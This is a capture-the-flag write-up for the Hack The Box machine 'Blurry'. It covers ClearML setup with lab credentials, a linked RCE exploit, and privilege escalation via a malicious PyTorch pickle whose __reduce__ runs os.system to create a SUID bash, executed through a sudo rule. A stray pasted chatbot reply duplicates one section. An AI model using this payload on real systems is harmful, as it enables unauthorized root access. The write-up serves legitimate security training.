## Blurry HTB Write-Up

### Box Details
- **Box Name:** Blurry
- **Difficulty:** Medium
- **IP Address:** 10.10.11.19
- **Points:** 45

### /etc/hosts Configuration

Add the following lines to your `/etc/hosts` file:

```bash
10.10.10.X blurry.htb
10.10.10.X app.blurry.htb
10.10.10.X api.blurry.htb
10.10.10.X files.blurry.htb
```

## Introduction

I'm going to be straightforward with this write-up because I didn't spend a lot of time on enumeration—it was fairly quick for me. Thus, I'm skipping the usual enumeration steps and jumping straight to the exploitation phase, as that's where I focused my efforts.

After visiting blurry.htb, I was redirected to app.blurry.htb. I proxied the site through Burp Suite, which revealed additional subdomains. i added them to my /etc/hosts files


### On app.blurry.htb

![2024-09-10_18-05](https://github.com/user-attachments/assets/0cb8ac87-ec3d-416b-afc7-4e84d6e2cd1f)


We’re greeted with the ClearML dashboard. After browsing around a bit, I decided to check for any known exploits before delving deeper. Fortunately, I found two potential exploits.

I chose to work with a simpler one, which can be found [here](https://github.com/h3xm4n/ClearML-vulnerability-exploit-RCE-2024-CVE-2024-24590-/tree/main). 

From the README, it was clear that we needed to set up ClearML on our host to make the exploit work.

### Setting Up ClearML

I had some problems setting up ClearML, as despite installing the package, I was still having trouble running `clearml-init`. 

So, I decided to use a virtual environment (venv). If you already have ClearML running, you can skip this part. Otherwise, follow these steps:

1. **Install the venv package if you don’t have it set up already:**

```bash
sudo apt install python3.11-venv
```

Got it! Here’s the updated Markdown in one code block:

markdown

### Setting Up ClearML

I had some problems setting up ClearML, as despite installing the package, I was still having trouble running `clearml-init`. 

So, I decided to use a virtual environment (venv). If you already have ClearML running, you can skip this part. Otherwise, follow these steps:

1. **Install the venv package if you don’t have it set up already:**

```bash
sudo apt install python3.11-venv
```
Create and activate the virtual environment:

```bash

python3 -m venv clearml

source clearml/bin/activate
```
Install ClearML in the virtual environment:

```bash
pip install clearml
```
run clearml-init to configure ClearML in the virtual environment:

```bash
clearml-init
```
when we run clear ml
```
──(clearml)─(mofe㉿mofe)-[~/files/htb/blurry]
└─$ clearml-init              

ClearML SDK setup process

Please create new clearml credentials through the settings page in your `clearml-server` web app (e.g. http://localhost:8080//settings/workspace-configuration) 
Or create a free account at https://app.clear.ml/settings/workspace-configuration

In settings page, press "Create new credentials", then press "Copy to clipboard".

Paste copied configuration here:
```
we can get our new credentials from the dashbaord


click on get started
![2024-09-10_18-12](https://github.com/user-attachments/assets/f51223ab-266f-4330-bcd1-b8c31a12c224)




click on create credentials
![2024-09-10_18-12_1](https://github.com/user-attachments/assets/78f05bd5-12b4-4274-9af0-3aa8c3acc334)

![2024-09-10_18-13](https://github.com/user-attachments/assets/e59a8aac-5a81-4dd8-975b-adc30f7d2a61)

![2024-09-10_18-13_1](https://github.com/user-attachments/assets/0f15b09e-5388-4014-8d49-7482754a89fe)


copy the configuration information go back to your terminal and paste it 
```bash
clearml-init              

ClearML SDK setup process

Please create new clearml credentials through the settings page in your `clearml-server` web app (e.g. http://localhost:8080//settings/workspace-configuration) 
Or create a free account at https://app.clear.ml/settings/workspace-configuration

In settings page, press "Create new credentials", then press "Copy to clipboard".

Paste copied configuration here:
api {
  web_server: http://app.blurry.htb
  api_server: http://api.blurry.htb
  files_server: http://files.blurry.htb
  credentials {
    "access_key" = "ZRGL74SLK27QMCJXHFXP"
    "secret_key" = "Gvs74LFueysuyyyjcWstXpxH7uy0MF7QwMrMGfIaNsbRsdLLyr"
  }
}
Detected credentials key="ZRGL74SLK27QMCJXHFXP" secret="Gvs7***"

ClearML Hosts configuration:
Web App: http://app.blurry.htb
API: http://api.blurry.htb
File Store: http://files.blurry.htb

Verifying credentials ...
Credentials verified!

New configuration stored in /home/mofe/clearml.conf
ClearML setup completed successfully.
```
### Exploitation

Now that we've set up ClearML, all that's left is to set up our listener, edit the [exploit](https://github.com/h3xm4n/ClearML-vulnerability-exploit-RCE-2024-CVE-2024-24590-/tree/main)  file to include our IP and port number, and then run the exploit.

it takes a short while so be patient in a few moments we get our shell

then upgrade your shell
```bash
 sudo -l
Matching Defaults entries for jippity on blurry:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jippity may run the following commands on blurry:
    (root) NOPASSWD: /usr/bin/evaluate_model /models/*.pth
jippity@blurry:~$
```
this output shows that the user jippity can run the /usr/bin/evaluate_model command as root without providing a password. The command can be run with any .pth file located in the /models/ directory. This could potentially be used for a Local Privilege Escalation (LPE) attack if we can craft a .pth with the right payload we might be able to escalate

i check the /models/ directory 

```bash
ls -lad /models
drwxrwxr-x 2 root jippity 4096 Sep 10 09:06 /models
```
    Owner: root
    Group: jippity
    Permissions: drwxrwxr-x

This means:
    The jippity user can write to the /models directory.
    You can place files in this directory, including your .pth files.
    
 next step was to understand how the /usr/bin/evaluate_model program worked
 it's readable bash file
```bash
#!/bin/bash
# Evaluate a given model against our proprietary dataset.
# Security checks against model file included.

if [ "$#" -ne 1 ]; then
    /usr/bin/echo "Usage: $0 <path_to_model.pth>"
    exit 1
fi

MODEL_FILE="$1"
TEMP_DIR="/opt/temp"
PYTHON_SCRIPT="/models/evaluate_model.py"  

/usr/bin/mkdir -p "$TEMP_DIR"

file_type=$(/usr/bin/file --brief "$MODEL_FILE")

# Extract based on file type
if [[ "$file_type" == *"POSIX tar archive"* ]]; then
    # POSIX tar archive (older PyTorch format)
    /usr/bin/tar -xf "$MODEL_FILE" -C "$TEMP_DIR"
elif [[ "$file_type" == *"Zip archive data"* ]]; then
    # Zip archive (newer PyTorch format)
    /usr/bin/unzip -q "$MODEL_FILE" -d "$TEMP_DIR"
else
    /usr/bin/echo "[!] Unknown or unsupported file format for $MODEL_FILE"
    exit 2
fi

/usr/bin/find "$TEMP_DIR" -type f \( -name "*.pkl" -o -name "pickle" \) -print0 | while IFS= read -r -d $'\0' extracted_pkl; do
    fickling_output=$(/usr/local/bin/fickling -s --json-output /dev/fd/1 "$extracted_pkl")

    if /usr/bin/echo "$fickling_output" | /usr/bin/jq -e 'select(.severity == "OVERTLY_MALICIOUS")' >/dev/null; then
        /usr/bin/echo "[!] Model $MODEL_FILE contains OVERTLY_MALICIOUS components and will be deleted."
 /bin/rm "$MODEL_FILE"
        break
    fi
done

/usr/bin/find "$TEMP_DIR" -type f -exec /bin/rm {} +
/bin/rm -rf "$TEMP_DIR"

if [ -f "$MODEL_FILE" ]; then
    /usr/bin/echo "[+] Model $MODEL_FILE is considered safe. Processing..."
    /usr/bin/python3 "$PYTHON_SCRIPT" "$MODEL_FILE"
fi
```
this is a lot to unpack but long strory short
Usage Check: The script checks if exactly one argument (path to the model file) is provided.

File Extraction: Depending on the file type:

    POSIX tar archive: Extracts the contents to /opt/temp using tar.
    Zip archive: Extracts the contents to /opt/temp using unzip.

Malicious Content Detection:

    It uses fickling to scan for malicious content in any .pkl or pickle files found within the extracted content.
    If any component is deemed overtly malicious, it deletes the model file.

Execution:

    If the model file is considered safe after scanning, it processes the model using a Python script (/models/evaluate_model.py).

#### evaluate_model.py

```python
import torch
import torch.nn as nn
from torchvision import transforms
from torchvision.datasets import CIFAR10
from torch.utils.data import DataLoader, Subset
import numpy as np
import sys


class CustomCNN(nn.Module):
    def __init__(self):
        super(CustomCNN, self).__init__()
        self.conv1 = nn.Conv2d(in_channels=3, out_channels=16, kernel_size=3, padding=1)
        self.conv2 = nn.Conv2d(in_channels=16, out_channels=32, kernel_size=3, padding=1)
        self.pool = nn.MaxPool2d(kernel_size=2, stride=2, padding=0)
        self.fc1 = nn.Linear(in_features=32 * 8 * 8, out_features=128)
        self.fc2 = nn.Linear(in_features=128, out_features=10)
        self.relu = nn.ReLU()

    def forward(self, x):
        x = self.pool(self.relu(self.conv1(x)))
        x = self.pool(self.relu(self.conv2(x)))
        x = x.view(-1, 32 * 8 * 8)
        x = self.relu(self.fc1(x))
        x = self.fc2(x)
        return x


def load_model(model_path):
    model = CustomCNN()
    
    state_dict = torch.load(model_path)
    model.load_state_dict(state_dict)
    
    model.eval()  
    return model

def prepare_dataloader(batch_size=32):
    transform = transforms.Compose([
        transforms.RandomHorizontalFlip(),
        transforms.RandomCrop(32, padding=4),
        transforms.ToTensor(),
        transforms.Normalize(mean=[0.4914, 0.4822, 0.4465], std=[0.2023, 0.1994, 0.2010]),
    ])
    
    dataset = CIFAR10(root='/root/datasets/', train=False, download=False, transform=transform)
    subset = Subset(dataset, indices=np.random.choice(len(dataset), 64, replace=False))
    dataloader = DataLoader(subset, batch_size=batch_size, shuffle=False)
    return dataloader

def evaluate_model(model, dataloader):
    correct = 0
    total = 0
    with torch.no_grad():  
        for images, labels in dataloader:
            outputs = model(images)
            _, predicted = torch.max(outputs.data, 1)
            total += labels.size(0)
            correct += (predicted == labels).sum().item()
    
    accuracy = 100 * correct / total
    print(f'[+] Accuracy of the model on the test dataset: {accuracy:.2f}%')

def main(model_path):
    model = load_model(model_path)
    print("[+] Loaded Model.")
    dataloader = prepare_dataloader()
    print("[+] Dataloader ready. Evaluating model...")
    evaluate_model(model, dataloader)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python script.py <path_to_model.pth>")
    else:
        model_path = sys.argv[1]  # Path to the .pth file
        main(model_path)

```
i'm not going to fully explain the contents of /models/evaluate_model.py


But it is used to load and evaluate a PyTorch model, specifically a CustomCNN (convolutional neural network model with two convolutional layers followed by fully connected layers.)

then the `load_model(model_path)` function loads the model’s state dictionary from the specified file path and prepares it for evaluation.
this is where our payload will be fed

after trying a couple of exploits 
i was getting unsupported file format errors
```bash
sudo /usr/bin/evaluate_model /models/malicious.pth
[!] Unknown or unsupported file format for /models/malicious.pth
jippity@blurry:~$ file /models/malicious.pth 
/models/malicious.pth: ASCII text
```

after some research i realised this was because the `evaluate_model` script expects model files that are serialized in the PyTorch format

 Given that the script uses torch.load(), you can leverage Python's pickle module for this purpose.

 going forward with that info i came up with this script featuring chatgpt

```python
import torch
import os

class Exploit(torch.nn.Module):
    def __init__(self):
        super(Exploit, self).__init__()

    def forward(self):
        pass

    def __reduce__(self):
        return (os.system, ('cp /bin/bash /tmp/bash; chmod +s /tmp/bash; /tmp/bash',))

exploit = Exploit()
torch.save(exploit, 'exploit.pth')
```
#### summary of the script
torch: This is the PyTorch library. We use it to serialize (save) objects to .pth files, which is a common format for PyTorch models.
os: This library gives access to operating system functionalities, which we use to run shell commands.

`Exploit(torch.nn.Module)`: This class inherits from torch.nn.Module, making it compatible with PyTorch's serialization methods

`forward method`: A dummy forward method is defined, which is a requirement when you inherit from torch.nn.Module. In a real neural network, the forward method would define the forward pass (how the data moves through the layers of the network), but in this case, it does nothing since we're only using the class to deliver the payload.

the `__reduce__` method is hijacked to return a system command (os.system) instead of normal serialized data. When this object is deserialized (unpickled) during model evaluation, the operating system will execute the command provided 

### Priviledge Escalation
When you run this script it gives you and exploit.pth file
copy that file to the /models/ directory

and run your command
```bash
sudo /usr/bin/evaluate_model /models/exploit.pth
```
you'll get a root shell :)
we’ve successfully pwned Blurry! We used a combination of local privilege escalation and file format exploitation to gain root access. By crafting a malicious .pth file and leveraging the PyTorch model loading mechanism, we bypassed the security checks and executed our payload to escalate privileges

i still got one more in me  🙂
